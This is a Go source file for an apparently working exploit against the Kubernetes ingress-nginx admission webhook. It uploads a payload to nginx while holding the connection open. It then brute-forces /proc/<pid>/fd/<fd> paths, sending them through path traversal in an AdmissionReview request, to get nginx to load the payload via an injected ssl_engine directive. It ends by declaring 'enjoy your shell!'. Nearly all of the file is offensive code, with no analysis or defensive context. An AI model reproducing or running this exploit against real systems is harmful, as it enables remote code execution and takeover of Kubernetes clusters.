package nginx_ingress

import (
	"crypto/tls"
	_ "embed"
	"errors"
	"fmt"
	"io"
	"net"
	urlparse "net/url"
	"strings"
	"sync"
	"text/template"
	"time"

	"github.com/guonaihong/gout"
	log "github.com/sirupsen/logrus"
	v1 "k8s.io/api/admission/v1"
)

var Verbose bool = false

func BadUploadHTTP(url *urlparse.URL) (net.Conn, error) {
	host := url.Host
	if url.Port() == "" {
		host = host + ":80"
	}

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return nil, err
	}
	return conn, nil

}

func BadUploadHTTPS(url *urlparse.URL) (*tls.Conn, error) {
	host := url.Host
	if url.Port() == "" {
		host = host + ":443"
	}
	conn, err := tls.Dial("tcp", host, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func BadUploader(URL string, payload Payload) error {
	url, err := urlparse.Parse(URL)
	if err != nil {
		return err
	}
	var conn net.Conn
	if url.Scheme == "http" {
		conn, err = BadUploadHTTP(url)
	} else if url.Scheme == "https" {
		conn, err = BadUploadHTTPS(url)
	}
	if err != nil {
		return err
	}
	defer conn.Close()
	contentLength := fmt.Sprintf("%v", 1024*1024)
	_, _ = conn.Write([]byte(`POST ` + url.Path + " HTTP/1.1\r\n"))
	_, _ = conn.Write([]byte(`Host: ` + url.Host + "\r\n"))
	_, _ = conn.Write([]byte("Content-Type: application/octet-stream\r\n"))
	_, _ = conn.Write([]byte("Content-Length: " + contentLength + "\r\n"))
	_, _ = conn.Write([]byte("Connection: keep-alive\r\n"))
	_, _ = conn.Write([]byte("Accept: */*\r\n"))
	_, _ = conn.Write([]byte("\r\n"))
	_, _ = conn.Write([]byte(payload)) // upload payload first
	for {
		if _, err := conn.Write([]byte{0x90}); err == io.EOF || err != nil {
			break
		}
		time.Sleep(10 * time.Microsecond)
	}
	data, err := io.ReadAll(conn)
	if err != nil {
		return err
	}
	log.Debugf("Responsed: %v", string(data))
	return nil
}

// Uploader is old one of uploading payload
func Uploader(URL string, payload Payload) error {
	return gout.NewWithOpt(gout.WithInsecureSkipVerify(), gout.WithTimeout(100*time.Second)).
		POST(URL).Debug(Verbose).SetBody([]byte(payload)).
		SetHeader(gout.H{
			"Content-Type":   "application/octet-stream",
			"Content-Length": 1024 * 2024 * 1,
			"Connection":     "keep-alive",
			"Accept":         "*/*",
		}).Do()
}

func UploadThread(URL string, payload Payload, stop chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
			t1 := time.Now()
			// err := Uploader(URL, payload)
			err := BadUploader(URL, payload)
			t2 := time.Now()
			log.Debugf("Upload time is %v, err %v", t2.Sub(t1), err)
		}
	}
}

type ExploitMethod struct {
	IsAuthTLSMatchCN bool
	AuthSecret       string
	IsAuthURL        bool
	IsMirrorWithUID  bool
}

//go:embed validate.json
var validateJsonTmpl string

func RenderValidateJSON(e ExploitMethod) error {
	tpl, err := template.New("test").Parse(validateJsonTmpl)
	if err != nil {
		return err
	}
	var buf strings.Builder
	err = tpl.Execute(&buf, e)
	if err != nil {
		return err
	}
	validateJson = buf.String()
	return nil
}

func ValidateJson() string {
	return validateJson
}

var validateJson string

func ValidateWebhookSpecificFilePath(URL string, path string) error {
	var resp v1.AdmissionReview
	// 								http://example.com/#;}}}\n\nssl_engine xxxxxxxxxxxxx;\n\n
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	evilUrl := fmt.Sprintf("../../../../..%v", path)
	log.Debugf("trying file %v", path)
	fullPayload := strings.Replace(validateJson, "foobar", evilUrl, 1)
	log.Tracef("payload: %v", fullPayload)
	err := gout.NewWithOpt(gout.WithInsecureSkipVerify(), gout.WithTimeout(100*time.Second)).
		POST(URL).Debug(Verbose).
		SetBody(fullPayload).
		BindJSON(&resp).Do()
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Result != nil {
		log.Tracef("response: %v", resp)
		log.Debugf("WebHook Validation Result: %v", resp.Response.Result.Message)
		if strings.Contains(resp.Response.Result.Message, "could not load the shared library") {
			return errors.New("not found, load library failed")
		}
		if strings.Contains(resp.Response.Result.Message, "Symbol not found:") {
			return nil // found and exploited successfully
		}
	}
	return errors.New("response success, but exploit unknown failed")
}

func ValidateWebHook(URL string, fd, pid int) error {
	var resp v1.AdmissionReview
	// 								http://example.com/#;}}}\n\nssl_engine xxxxxxxxxxxxx;\n\n
	evilUrl := fmt.Sprintf("../../../../../../proc/%v/fd/%v", pid, fd)
	log.Debugf("trying pid %v, fd %v", pid, fd)
	log.Debugf("evil url: %v", evilUrl)
	fullPayload := strings.Replace(validateJson, "foobar", evilUrl, 1)
	log.Tracef("payload: %v", fullPayload)
	err := gout.NewWithOpt(gout.WithInsecureSkipVerify(), gout.WithTimeout(100*time.Second)).
		POST(URL).Debug(Verbose).
		SetBody(fullPayload).
		BindJSON(&resp).Do()
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Result != nil {
		log.Tracef("response: %v", resp)
		log.Debugf("WebHook Validation Result: %v", resp.Response.Result.Message)
		if strings.Contains(resp.Response.Result.Message, "could not load the shared library") {
			return errors.New("not found, load library failed")
		}
		if strings.Contains(resp.Response.Result.Message, "Symbol not found:") {
			return nil // found and exploited successfully
		}
	}
	return errors.New("response success, but exploit unknown failed")
}

func OnlyAdmissionRequest(WebhookUrl string, fp string) {
	err := ValidateWebhookSpecificFilePath(WebhookUrl, fp)
	if err != nil {
		log.Errorf("Exploit failed: %v", err)
	} else {
		log.Infof("Exploit success!")
	}
}

func OnlyUplaoder(UploadUrl string, p Payload) {
	var stopUpload = make(chan struct{})
	UploadThread(UploadUrl, p, stopUpload)
}

func Exploit(WebHookUrl string, UploadUrl string, p Payload, fdRangeStart, pidRangeStart, fdRangeEnd, pidRangeEnd int) {
	var stopUpload = make(chan struct{})

	go UploadThread(UploadUrl, p, stopUpload)
	time.Sleep(1 * time.Millisecond) // let Upload Thread Run!
	var wg sync.WaitGroup
	successFlag := false
	for fd := fdRangeStart; fd < fdRangeStart+fdRangeEnd; fd++ {
		for pid := pidRangeStart; pid < pidRangeStart+pidRangeEnd; pid++ {
			wg.Add(1)
			go func(pid, fd int) {
				defer wg.Done()
				select {
				case <-stopUpload:
					return
				default:
					err := ValidateWebHook(WebHookUrl, fd, pid)
					if err == nil {
						log.Infof("Exploit Success! pid: %d, fd: %d", pid, fd)
						successFlag = true
						stopUpload <- struct{}{}
						defer close(stopUpload)
					}
				}
			}(pid, fd)
		}
	}
	wg.Wait()
	if !successFlag {
		log.Errorf("Exploit run complete, but looks failed!")
	} else {
		log.Infof("Exploit run complete and success, enjoy your shell!")
	}
	return
}
